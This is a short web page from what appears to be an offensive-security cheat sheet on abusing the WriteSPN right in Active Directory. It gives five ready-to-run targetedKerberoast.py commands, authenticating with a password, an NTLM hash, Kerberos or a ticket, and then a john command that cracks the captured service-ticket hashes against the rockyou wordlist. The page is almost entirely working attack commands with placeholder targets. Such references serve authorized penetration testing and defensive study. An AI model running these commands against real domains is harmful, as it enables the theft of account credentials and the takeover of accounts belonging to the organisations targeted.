---
title: "WriteSPN"
tags: ["Active Directory", "WriteSPN", "Domain Controller", "Targeted Kerberoast", "Windows"]
---

{{< filter_buttons >}}

### Targeted Kerberoast

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Targeted Kerberoast

```console {class="password"}
# Password
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --dc-ip '<DC_IP>'
```

```console {class="ntlm"}
# NTLM
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -H :<HASH> --dc-ip '<DC_IP>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --dc-host '<DC>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -H :<HASH> -k --dc-host '<DC>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -k --no-pass --dc-host '<DC>'
```

#### 2. Hash Crack

```console
john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>
```

<small>*Ref: [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)*</small>

{{< /tabcontent >}}
